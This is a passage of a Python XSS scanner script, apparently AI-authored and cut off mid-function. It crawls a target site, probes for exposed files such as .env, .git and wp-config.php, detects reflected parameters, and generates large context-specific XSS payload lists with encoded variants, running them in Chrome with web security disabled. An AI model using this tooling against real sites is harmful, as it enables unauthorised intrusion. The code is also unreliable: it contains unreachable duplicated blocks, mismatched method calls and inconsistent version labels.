#!/usr/bin/env python3
"""
Advanced XSS Scanner v3.0 - Professional Grade
Author: AI Assistant
Description: A professional-grade XSS scanner with deep reconnaissance and Chrome-based testing
"""

import requests
import json
import time
import random
import string
import base64
import urllib.parse
import os
import sys
import re
import asyncio
import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs, unquote
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException, NoAlertPresentException
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed, ProcessPoolExecutor
import logging
from datetime import datetime
import hashlib
import queue
import multiprocessing
from dataclasses import dataclass
from typing import List, Dict, Set, Optional, Tuple

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('xss_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Data classes for better structure
@dataclass
class XSSPoint:
    url: str
    parameter: str
    method: str
    context: str
    form_data: Optional[Dict] = None
    is_reflected: bool = False

@dataclass
class XSSVulnerability:
    url: str
    parameter: str
    payload: str
    context: str
    method: str
    test_url: str
    screenshot: Optional[str] = None
    alert_text: Optional[str] = None
    severity: str = "High"
    timestamp: str = ""

@dataclass
class ReconData:
    target: str
    discovered_urls: Set[str]
    forms: List[Dict]
    parameters: Set[str]
    xss_points: List[XSSPoint]
    technologies: Set[str]
    sensitive_files: List[str]
    timestamp: str = ""

class Colors:
    """ANSI color codes for terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class AdvancedReconnaissance:
    """Advanced reconnaissance module with deep parameter discovery"""
    
    def __init__(self, target_url, max_depth=3, max_threads=20):
        self.target_url = target_url
        self.max_depth = max_depth
        self.max_threads = max_threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Configure connection pool
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=3
        )
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.visited_urls = set()
        self.discovered_urls = set()
        self.forms = []
        self.parameters = set()
        self.xss_points = []
        self.technologies = set()
        self.sensitive_files = []
        self.js_files = []
        self.api_endpoints = []
        self.parameter_patterns = [
            r'(\w+)=([^&\s]+)',
            r'name=["\'](\w+)["\']',
            r'id=["\'](\w+)["\']',
            r'class=["\']([^"\']*(\w+)[^"\']*)["\']',
            r'data-(\w+)=',
            r'ng-(\w+)=',
            r'v-(\w+)=',
            r'@(\w+)=',
            r'#(\w+)',
            r'\$(\w+)',
        ]
        
    def print_banner(self):
        """Print the scanner banner"""
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                        ADVANCED XSS SCANNER v2.0                            ║
║                    Chrome-Based XSS Testing & PoC Capture                   ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
Target: {Colors.YELLOW}{self.target_url}{Colors.END}
Started: {Colors.GREEN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}
Mode: {Colors.MAGENTA}Real Chrome Browser Testing{Colors.END}
"""
        print(banner)
    
    def run_deep_reconnaissance(self):
        """Run comprehensive reconnaissance"""
        logger.info(f"{Colors.BLUE}[RECON] Starting deep reconnaissance...{Colors.END}")
        
        # Phase 1: Initial discovery
        self.discovered_urls.add(self.target_url)
        self.deep_crawling()
        
        # Phase 2: Parameter discovery
        self.discover_parameters()
        
        # Phase 3: Technology detection
        self.detect_technologies()
        
        # Phase 4: Sensitive file discovery
        # Skip sensitive files - not relevant for XSS testing
        
        # Phase 5: JavaScript analysis
        self.analyze_javascript()
        
        # Phase 6: API endpoint discovery
        self.discover_api_endpoints()
        
        # Phase 7: XSS point analysis
        self.analyze_xss_points()
        
        logger.info(f"{Colors.GREEN}[RECON] Reconnaissance completed: {len(self.discovered_urls)} URLs, {len(self.forms)} forms, {len(self.parameters)} parameters{Colors.END}")
    
    def deep_crawling(self):
        """Deep crawling with parallel processing"""
        logger.info(f"{Colors.BLUE}[RECON] Starting deep crawling...{Colors.END}")
        
        urls_to_visit = [self.target_url]
        depth = 0
        
        while urls_to_visit and depth < self.max_depth:
            current_urls = urls_to_visit.copy()
            urls_to_visit.clear()
            depth += 1
            
            logger.info(f"{Colors.CYAN}[CRAWL] Depth {depth} - {len(current_urls)} URLs{Colors.END}")
            
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = {executor.submit(self.crawl_url_advanced, url): url for url in current_urls}
                
                for future in as_completed(futures):
                    url = futures[future]
                    try:
                        result = future.result()
                        if result:
                            new_urls, forms, params, js_files, tech = result
                            urls_to_visit.extend(new_urls)
                            self.forms.extend(forms)
                            self.parameters.update(params)
                            self.js_files.extend(js_files)
                            self.technologies.update(tech)
                    except Exception as e:
                        logger.error(f"{Colors.RED}[CRAWL] Error processing {url}: {str(e)}{Colors.END}")
    
    def discover_parameters(self):
        """Discover parameters from various sources"""
        logger.info(f"{Colors.BLUE}[RECON] Discovering parameters...{Colors.END}")
        
        # Common parameter wordlist
        common_params = [
            'id', 'name', 'user', 'username', 'email', 'password', 'pass', 'pwd',
            'search', 'query', 'q', 'keyword', 'term', 'value', 'val', 'data',
            'input', 'text', 'message', 'msg', 'content', 'desc', 'description',
            'title', 'subject', 'topic', 'category', 'cat', 'type', 'sort',
            'order', 'limit', 'offset', 'page', 'p', 'size', 'count', 'num',
            'date', 'time', 'year', 'month', 'day', 'hour', 'minute',
            'lang', 'language', 'locale', 'country', 'region', 'city',
            'price', 'cost', 'amount', 'total', 'sum', 'quantity', 'qty',
            'status', 'state', 'active', 'enabled', 'disabled', 'visible',
            'action', 'method', 'mode', 'format', 'type', 'style', 'class',
            'id', 'ref', 'reference', 'key', 'token', 'session', 'cookie',
            'callback', 'redirect', 'return', 'next', 'prev', 'back',
            'filter', 'where', 'having', 'group', 'order', 'sort',
            'join', 'union', 'select', 'insert', 'update', 'delete',
            'create', 'drop', 'alter', 'grant', 'revoke', 'exec', 'execute'
        ]
        
        # Add discovered parameters
        self.parameters.update(common_params)
        
        # Extract parameters from URLs
        for url in self.discovered_urls:
            if '?' in url:
                query_params = parse_qs(urlparse(url).query)
                self.parameters.update(query_params.keys())
        
        # Extract parameters from forms
        for form in self.forms:
            for input_field in form.get('inputs', []):
                if input_field.get('name'):
                    self.parameters.add(input_field['name'])
        
        logger.info(f"{Colors.GREEN}[RECON] Discovered {len(self.parameters)} parameters{Colors.END}")
    
    def detect_technologies(self):
        """Detect web technologies"""
        logger.info(f"{Colors.BLUE}[RECON] Detecting technologies...{Colors.END}")
        
        for url in list(self.discovered_urls)[:10]:  # Check first 10 URLs
            try:
                response = self.session.get(url, timeout=10)
                
                # Server headers
                server = response.headers.get('Server', '').lower()
                if 'apache' in server:
                    self.technologies.add('Apache')
                elif 'nginx' in server:
                    self.technologies.add('Nginx')
                elif 'iis' in server:
                    self.technologies.add('IIS')
                
                # X-Powered-By
                powered_by = response.headers.get('X-Powered-By', '').lower()
                if powered_by:
                    self.technologies.add(powered_by)
                
                # Content analysis
                content = response.text.lower()
                if 'jquery' in content:
                    self.technologies.add('jQuery')
                if 'bootstrap' in content:
                    self.technologies.add('Bootstrap')
                if 'angular' in content:
                    self.technologies.add('Angular')
                if 'react' in content:
                    self.technologies.add('React')
                if 'vue' in content:
                    self.technologies.add('Vue.js')
                if 'php' in content:
                    self.technologies.add('PHP')
                if 'asp.net' in content:
                    self.technologies.add('ASP.NET')
                if 'django' in content:
                    self.technologies.add('Django')
                if 'flask' in content:
                    self.technologies.add('Flask')
                if 'laravel' in content:
                    self.technologies.add('Laravel')
                
            except Exception as e:
                logger.error(f"{Colors.RED}[TECH] Error detecting technologies for {url}: {str(e)}{Colors.END}")
        
        logger.info(f"{Colors.GREEN}[RECON] Detected technologies: {', '.join(self.technologies)}{Colors.END}")
    
    def find_sensitive_files(self):
        """Find sensitive files and directories"""
        logger.info(f"{Colors.BLUE}[RECON] Finding sensitive files...{Colors.END}")
        
        sensitive_patterns = [
            'admin', 'administrator', 'login', 'signin', 'signup', 'register',
            'config', 'configuration', 'settings', 'setup', 'install',
            'backup', 'backups', 'bak', 'old', 'temp', 'tmp', 'test',
            'dev', 'development', 'staging', 'beta', 'alpha', 'demo',
            'api', 'apis', 'rest', 'graphql', 'soap', 'xmlrpc',
            'phpinfo', 'info.php', 'test.php', 'debug.php', 'error.php',
            '.env', '.git', '.svn', '.hg', '.bzr', '.cvs',
            'robots.txt', 'sitemap.xml', 'crossdomain.xml', 'clientaccesspolicy.xml',
            'web.config', '.htaccess', '.htpasswd', 'wp-config.php',
            'database.sql', 'dump.sql', 'backup.sql', 'data.sql',
            'logs', 'log', 'error.log', 'access.log', 'debug.log',
            'uploads', 'files', 'documents', 'images', 'media',
            'includes', 'includes', 'lib', 'libs', 'vendor', 'node_modules'
        ]
        
        base_url = self.target_url.rstrip('/')
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for pattern in sensitive_patterns:
                test_urls = [
                    f"{base_url}/{pattern}",
                    f"{base_url}/{pattern}.php",
                    f"{base_url}/{pattern}.html",
                    f"{base_url}/{pattern}.txt",
                    f"{base_url}/.{pattern}",
                    f"{base_url}/{pattern}/",
                    f"{base_url}/{pattern}/index.php",
                    f"{base_url}/{pattern}/index.html"
                ]
                for test_url in test_urls:
                    futures.append(executor.submit(self.check_sensitive_file, test_url))
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.sensitive_files.append(result)
                        logger.info(f"{Colors.YELLOW}[SENSITIVE] Found: {result}{Colors.END}")
                except Exception as e:
                    pass
        
        logger.info(f"{Colors.GREEN}[RECON] Found {len(self.sensitive_files)} sensitive files{Colors.END}")
    
    def check_sensitive_file(self, url):
        """Check if sensitive file exists"""
        try:
            response = self.session.head(url, timeout=5)
            if response.status_code == 200:
                return url
        except:
            pass
        return None
    
    def analyze_javascript(self):
        """Analyze JavaScript files for parameters and endpoints"""
        logger.info(f"{Colors.BLUE}[RECON] Analyzing JavaScript files...{Colors.END}")
        
        for js_url in self.js_files[:20]:  # Limit to first 20 JS files
            try:
                response = self.session.get(js_url, timeout=10)
                content = response.text
                
                # Extract parameters from JS
                for pattern in self.parameter_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if isinstance(match, tuple):
                            self.parameters.update(match)
                        else:
                            self.parameters.add(match)
                
                # Extract API endpoints
                api_patterns = [
                    r'["\']([^"\']*api[^"\']*)["\']',
                    r'["\']([^"\']*endpoint[^"\']*)["\']',
                    r'["\']([^"\']*service[^"\']*)["\']',
                    r'["\']([^"\']*ajax[^"\']*)["\']',
                    r'["\']([^"\']*fetch[^"\']*)["\']',
                    r'["\']([^"\']*xhr[^"\']*)["\']'
                ]
                
                for pattern in api_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches:
                        if match.startswith('/') or match.startswith('http'):
                            self.api_endpoints.append(match)
                
            except Exception as e:
                logger.error(f"{Colors.RED}[JS] Error analyzing {js_url}: {str(e)}{Colors.END}")
        
        logger.info(f"{Colors.GREEN}[RECON] Analyzed {len(self.js_files)} JavaScript files{Colors.END}")
    
    def discover_api_endpoints(self):
        """Discover API endpoints"""
        logger.info(f"{Colors.BLUE}[RECON] Discovering API endpoints...{Colors.END}")
        
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/rest', '/restapi', '/graphql',
            '/soap', '/xmlrpc', '/rpc', '/service', '/services', '/ws',
            '/webservice', '/endpoint', '/endpoints', '/ajax', '/json',
            '/data', '/feed', '/rss', '/atom', '/sitemap'
        ]
        
        base_url = self.target_url.rstrip('/')
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for path in api_paths:
                test_url = f"{base_url}{path}"
                futures.append(executor.submit(self.check_api_endpoint, test_url))
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.api_endpoints.append(result)
                        logger.info(f"{Colors.YELLOW}[API] Found: {result}{Colors.END}")
                except Exception as e:
                    pass
        
        logger.info(f"{Colors.GREEN}[RECON] Found {len(self.api_endpoints)} API endpoints{Colors.END}")
    
    def check_api_endpoint(self, url):
        """Check if API endpoint exists"""
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code in [200, 401, 403, 405]:
                return url
        except:
            pass
        return None
    
    def analyze_xss_points(self):
        """Analyze discovered points for XSS potential"""
        logger.info(f"{Colors.BLUE}[RECON] Analyzing XSS points...{Colors.END}")
        
        for url in self.discovered_urls:
            # Analyze URL parameters
            if '?' in url:
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                for param in query_params.keys():
                    xss_point = XSSPoint(
                        url=url,
                        parameter=param,
                        method='GET',
                        context='html',
                        is_reflected=self.test_parameter_reflection(url, param)
                    )
                    self.xss_points.append(xss_point)
            
            # Analyze forms
            for form in self.forms:
                if form['action'] == url:
                    for input_field in form.get('inputs', []):
                        if input_field.get('name'):
                            xss_point = XSSPoint(
                                url=url,
                                parameter=input_field['name'],
                                method=form['method'],
                                context='html',
                                form_data=form,
                                is_reflected=self.test_parameter_reflection(url, input_field['name'])
                            )
                            self.xss_points.append(xss_point)
        
        logger.info(f"{Colors.GREEN}[RECON] Found {len(self.xss_points)} XSS testing points{Colors.END}")
    
    def test_parameter_reflection(self, url, parameter):
        """Test if parameter is reflected in response"""
        try:
            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
            test_url = url.replace(parameter + "=" + parse_qs(urlparse(url).query)[parameter][0], parameter + "=" + test_value)
            
            response = self.session.get(test_url, timeout=5)
            return test_value in response.text
        except:
            return False
    
    def crawl_url_advanced(self, url):
        """Advanced URL crawling with comprehensive extraction"""
        if url in self.visited_urls:
            return None
        
        self.visited_urls.add(url)
        new_urls = []
        forms = []
        params = set()
        js_files = []
        tech = set()
        
        try:
            response = self.session.get(url, timeout=15, allow_redirects=True)
            response.raise_for_status()
            
            # Update final URL after redirects
            final_url = response.url
            self.discovered_urls.add(final_url)
            
            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract forms
            for form in soup.find_all('form'):
                form_data = self.extract_form_data_advanced(form, final_url)
                if form_data:
                    forms.append(form_data)
            
            # Extract links
            for link in soup.find_all('a', href=True):
                href = link['href']
                absolute_url = urljoin(final_url, href)
                if self.is_valid_url(absolute_url) and absolute_url not in self.visited_urls:
                    new_urls.append(absolute_url)
            
            # Extract JavaScript files
            for script in soup.find_all('script', src=True):
                script_url = urljoin(final_url, script['src'])
                if self.is_valid_url(script_url):
                    new_urls.append(script_url)
                    js_files.append(script_url)
            
            # Extract parameters from URL
            parsed_url = urlparse(final_url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                params.update(query_params.keys())
            
            # Extract parameters from forms
            for form in forms:
                for input_field in form.get('inputs', []):
                    if input_field.get('name'):
                        params.add(input_field['name'])
            
            # Extract parameters from page content
            content = response.text
            for pattern in self.parameter_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if isinstance(match, tuple):
                        params.update(match)
                    else:
                        params.add(match)
            
            # Technology detection
            server_header = response.headers.get('Server', '').lower()
            if 'apache' in server_header:
                tech.add('Apache')
            elif 'nginx' in server_header:
                tech.add('Nginx')
            elif 'iis' in server_header:
                tech.add('IIS')
            
            powered_by = response.headers.get('X-Powered-By', '').lower()
            if powered_by:
                tech.add(powered_by)
            
            # Content analysis
            content_lower = content.lower()
            if 'jquery' in content_lower:
                tech.add('jQuery')
            if 'bootstrap' in content_lower:
                tech.add('Bootstrap')
            if 'angular' in content_lower:
                tech.add('Angular')
            if 'react' in content_lower:
                tech.add('React')
            if 'vue' in content_lower:
                tech.add('Vue.js')
            if 'php' in content_lower:
                tech.add('PHP')
            if 'asp.net' in content_lower:
                tech.add('ASP.NET')
            if 'django' in content_lower:
                tech.add('Django')
            if 'flask' in content_lower:
                tech.add('Flask')
            if 'laravel' in content_lower:
                tech.add('Laravel')
            
        except Exception as e:
            logger.error(f"{Colors.RED}[CRAWL] Error processing {url}: {str(e)}{Colors.END}")
            return None
        
        return new_urls, forms, params, js_files, tech
    
    def extract_form_data_advanced(self, form, base_url):
        """Extract comprehensive form data"""
        form_data = {
            'action': form.get('action', ''),
            'method': form.get('method', 'GET').upper(),
            'inputs': [],
            'url': base_url
        }
        
        # Make action URL absolute
        if form_data['action']:
            form_data['action'] = urljoin(base_url, form_data['action'])
        else:
            form_data['action'] = base_url
        
        # Extract input fields
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', ''),
                'required': input_tag.has_attr('required'),
                'placeholder': input_tag.get('placeholder', ''),
                'id': input_tag.get('id', ''),
                'class': input_tag.get('class', [])
            }
            
            if input_data['name']:
                form_data['inputs'].append(input_data)
        
        return form_data if form_data['inputs'] else None
        
        self.visited_urls.add(url)
        new_urls = []
        forms = []
        params = set()
        
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            response.raise_for_status()
            
            # Update final URL after redirects
            final_url = response.url
            self.discovered_urls.add(final_url)
            
            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Extract forms
            for form in soup.find_all('form'):
                form_data = self.extract_form_data(form, final_url)
                if form_data:
                    forms.append(form_data)
            
            # Extract links
            for link in soup.find_all('a', href=True):
                href = link['href']
                absolute_url = urljoin(final_url, href)
                if self.is_valid_url(absolute_url) and absolute_url not in self.visited_urls:
                    new_urls.append(absolute_url)
            
            # Extract parameters from URL
            parsed_url = urlparse(final_url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                params.update(query_params.keys())
            
            # Extract JavaScript files
            for script in soup.find_all('script', src=True):
                script_url = urljoin(final_url, script['src'])
                if self.is_valid_url(script_url):
                    new_urls.append(script_url)
            
            # Technology detection
            self.detect_technologies(response, soup)
            
            # Look for sensitive files
            self.find_sensitive_files(final_url, soup)
            
        except Exception as e:
            logger.error(f"{Colors.RED}[CRAWL] Error processing {url}: {str(e)}{Colors.END}")
        
        return new_urls, forms, params
    
    def extract_form_data(self, form, base_url):
        """Extract form data and parameters"""
        form_data = {
            'action': form.get('action', ''),
            'method': form.get('method', 'GET').upper(),
            'inputs': [],
            'url': base_url
        }
        
        # Make action URL absolute
        if form_data['action']:
            form_data['action'] = urljoin(base_url, form_data['action'])
        else:
            form_data['action'] = base_url
        
        # Extract input fields
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', ''),
                'required': input_tag.has_attr('required')
            }
            
            if input_data['name']:
                form_data['inputs'].append(input_data)
        
        return form_data if form_data['inputs'] else None
    
    def analyze_url_for_xss(self, url):
        """Analyze URL for potential XSS points"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Check for reflected parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                for param in query_params.keys():
                    # Test if parameter is reflected
                    test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
                    test_url = url.replace(param + "=" + query_params[param][0], param + "=" + test_value)
                    
                    try:
                        test_response = self.session.get(test_url, timeout=5)
                        if test_value in test_response.text:
                            self.xss_points.append({
                                'url': url,
                                'parameter': param,
                                'method': 'GET',
                                'context': self.detect_context_from_response(test_response, test_value)
                            })
                            logger.info(f"{Colors.GREEN}[XSS_POINT] Found: {url}?{param}={Colors.END}")
                    except:
                        pass
        except:
            pass
    
    def detect_context_from_response(self, response, test_value):
        """Detect context where test value is reflected"""
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Check HTML context
        if test_value in response.text:
            for tag in soup.find_all():
                if test_value in str(tag):
                    # Check if it's in an attribute
                    for attr_name, attr_value in tag.attrs.items():
                        if test_value in str(attr_value):
                            return 'attribute'
                    return 'html'
        
        # Check JavaScript context
        for script in soup.find_all('script'):
            if test_value in script.string:
                return 'javascript'
        
        # Check CSS context
        for style in soup.find_all('style'):
            if test_value in style.string:
                return 'css'
        
        return 'html'  # Default
    
    def is_valid_url(self, url):
        """Check if URL is valid and within scope"""
        try:
            parsed = urlparse(url)
            target_domain = urlparse(self.target_url).netloc
            
            # Check if URL is within target domain
            if parsed.netloc and target_domain not in parsed.netloc:
                return False
            
            # Skip non-HTTP protocols
            if parsed.scheme not in ['http', 'https']:
                return False
            
            # Skip common file extensions
            skip_extensions = ['.pdf', '.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.ico']
            if any(url.lower().endswith(ext) for ext in skip_extensions):
                return False
            
            return True
        except:
            return False
    
    def generate_report(self):
        """Generate XSS reconnaissance report"""
        # Convert XSSPoint objects to dictionaries
        xss_points_dict = []
        for point in self.xss_points:
            xss_points_dict.append({
                'url': point.url,
                'parameter': point.parameter,
                'method': point.method,
                'context': point.context,
                'form_data': point.form_data,
                'is_reflected': point.is_reflected
            })
        
        report = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'discovered_urls': list(self.discovered_urls),
            'forms': self.forms,
            'parameters': list(self.parameters),
            'xss_points': xss_points_dict,
            'technologies': list(self.technologies),
            'sensitive_files': self.sensitive_files,
            'js_files': self.js_files,
            'api_endpoints': self.api_endpoints,
            'total_urls': len(self.discovered_urls),
            'total_forms': len(self.forms),
            'total_parameters': len(self.parameters),
            'total_xss_points': len(self.xss_points)
        }
        
        # Save report to file
        with open('xss_recon_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print summary
        print(f"\n{Colors.GREEN}{Colors.BOLD}=== XSS RECONNAISSANCE SUMMARY ==={Colors.END}")
        print(f"{Colors.CYAN}Target: {self.target_url}{Colors.END}")
        print(f"{Colors.CYAN}URLs discovered: {len(self.discovered_urls)}{Colors.END}")
        print(f"{Colors.CYAN}Forms found: {len(self.forms)}{Colors.END}")
        print(f"{Colors.CYAN}Parameters found: {len(self.parameters)}{Colors.END}")
        print(f"{Colors.CYAN}XSS testing points: {len(self.xss_points)}{Colors.END}")
        print(f"{Colors.CYAN}Technologies: {', '.join(self.technologies)}{Colors.END}")
        print(f"{Colors.CYAN}Sensitive files: {len(self.sensitive_files)}{Colors.END}")
        print(f"{Colors.GREEN}Report saved to: xss_recon_report.json{Colors.END}\n")
        
        return report

class AdvancedXSSScanner:
    """Advanced XSS scanner with Chrome-based testing and alert detection"""
    
    def __init__(self, recon_data):
        self.recon_data = recon_data
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.vulnerabilities = []
        self.driver = None
        self.unique_alert_id = f"XSS_SCANNER_{random.randint(10000, 99999)}"
        self.setup_selenium()
        
    def setup_selenium(self):
        """Setup Selenium WebDriver for XSS testing and screenshot capture"""
        try:
            chrome_options = Options()
            # Remove headless mode for real XSS testing
            # chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
            chrome_options.add_argument('--allow-running-insecure-content')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            logger.info(f"{Colors.GREEN}[SELENIUM] WebDriver initialized successfully for XSS testing{Colors.END}")
        except Exception as e:
            logger.error(f"{Colors.RED}[SELENIUM] Failed to initialize WebDriver: {str(e)}{Colors.END}")
            self.driver = None
    
    def generate_payloads_for_context(self, context):
        """Generate XSS payloads specific to the detected context"""
        payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<object data="javascript:alert(\'XSS\')">',
                '<embed src="javascript:alert(\'XSS\')">',
                '<form><button formaction="javascript:alert(\'XSS\')">',
                '<details open ontoggle="alert(\'XSS\')">',
                '<marquee onstart="alert(\'XSS\')">',
                '<video><source onerror="alert(\'XSS\')">',
                '<audio src=x onerror=alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<select onfocus=alert("XSS") autofocus>',
                '<textarea onfocus=alert("XSS") autofocus>',
                '<keygen onfocus=alert("XSS") autofocus>',
                '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
                '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
                '<embed src="data:text/html,<script>alert(\'XSS\')</script>">'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '" onfocus="alert(\'XSS\')" autofocus="',
                '" onload="alert(\'XSS\')"',
                '" onerror="alert(\'XSS\')"',
                '" onclick="alert(\'XSS\')"',
                '" onblur="alert(\'XSS\')"',
                '" onchange="alert(\'XSS\')"',
                '" onsubmit="alert(\'XSS\')"',
                '" onreset="alert(\'XSS\')"',
                '" onselect="alert(\'XSS\')"',
                '" onkeydown="alert(\'XSS\')"',
                '" onkeyup="alert(\'XSS\')"',
                '" onkeypress="alert(\'XSS\')"',
                '" onmousedown="alert(\'XSS\')"',
                '" onmouseup="alert(\'XSS\')"',
                '" onmousemove="alert(\'XSS\')"',
                '" onmouseout="alert(\'XSS\')"',
                '" onmouseenter="alert(\'XSS\')"',
                '" onmouseleave="alert(\'XSS\')"',
                '" ondblclick="alert(\'XSS\')"'
            ],
            'javascript': [
                ';alert("XSS");',
                '";alert("XSS");//',
                "';alert('XSS');//",
                '`;alert("XSS");//',
                '\\";alert("XSS");//',
                "\\';alert('XSS');//",
                '\\`;alert("XSS");//',
                '}alert("XSS");{',
                ']alert("XSS");[',
                ')alert("XSS");(',
                '=alert("XSS");',
                '+alert("XSS");',
                '-alert("XSS");',
                '*alert("XSS");',
                '/alert("XSS");',
                '%alert("XSS");',
                '&alert("XSS");',
                '|alert("XSS");',
                '^alert("XSS");',
                '~alert("XSS");'
            ],
            'css': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                'url("data:text/html,<script>alert(\'XSS\')</script>")',
                'url("vbscript:alert(\'XSS\')")',
                'url("onload=alert(\'XSS\')")',
                'url("onerror=alert(\'XSS\')")',
                'url("onclick=alert(\'XSS\')")',
                'url("onmouseover=alert(\'XSS\')")',
                'url("onfocus=alert(\'XSS\')")',
                'url("onblur=alert(\'XSS\')")'
            ],
            'url': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")',
                'data:text/html,<img src=x onerror=alert("XSS")>',
                'data:text/html,<svg onload=alert("XSS")>',
                'data:text/html,<iframe src="javascript:alert(\'XSS\')">',
                'data:text/html,<object data="javascript:alert(\'XSS\')">',
                'data:text/html,<embed src="javascript:alert(\'XSS\')">',
                'data:text/html,<form><button formaction="javascript:alert(\'XSS\')">',
                'data:text/html,<details open ontoggle="alert(\'XSS\')">'
            ]
        }
        
        # Get base payloads for the context
        base_payloads = payloads.get(context, payloads['html'])
        
        # Add encoded variations
        encoded_payloads = []
        for payload in base_payloads:
            # URL encoding
            encoded_payloads.append(urllib.parse.quote(payload))
            # HTML entity encoding
            encoded_payloads.append(payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;'))
            # Base64 encoding
            try:
                encoded_payloads.append(base64.b64encode(payload.encode()).decode())
            except:
                pass
            # Unicode encoding
            unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in payload)
            encoded_payloads.append(unicode_payload)
        
        # Combine base and encoded payloads
        all_payloads = base_payloads + encoded_payloads
        
        return all_payloads
    
    def detect_form_context(self, url, parameter):
        """Detect context for form parameters"""
        try:
            # Send a test request to detect context
            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
            test_data = {parameter: test_value}
            
            response = self.session.post(url, data=test_data, timeout=10)
            
            # Check where the test value is reflected
            if test_value in response.text:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Check HTML context
                for tag in soup.find_all():
                    if test_value in str(tag):
                        # Check if it's in an attribute
                        for attr_name, attr_value in tag.attrs.items():
                            if test_value in str(attr_value):
                                return 'attribute'
                        return 'html'
                
                # Check JavaScript context
                for script in soup.find_all('script'):
                    if test_value in script.string:
                        return 'javascript'
                
                # Check CSS context
                for style in soup.find_all('style'):
                    if test_value in style.string:
                        return 'css'
            
            return 'html'  # Default
        except:
            return 'html'  # Default
    
    def detect_url_context(self, url, parameter):
        """Detect context for URL parameters"""
        try:
            # Send a test request to detect context
            test_value = f"XSS_TEST_{random.randint(1000, 9999)}"
            test_url = url.replace(parameter + "=" + parse_qs(urlparse(url).query)[parameter][0], parameter + "=" + test_value)
            
            response = self.session.get(test_url, timeout=10)
            
            # Check where the test value is reflected
            if test_value in response.text:
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Check HTML context
                for tag in soup.find_all():
                    if test_value in str(tag):
                        # Check if it's in an attribute
                        for attr_name, attr_value in tag.attrs.items():
                            if test_value in str(attr_value):
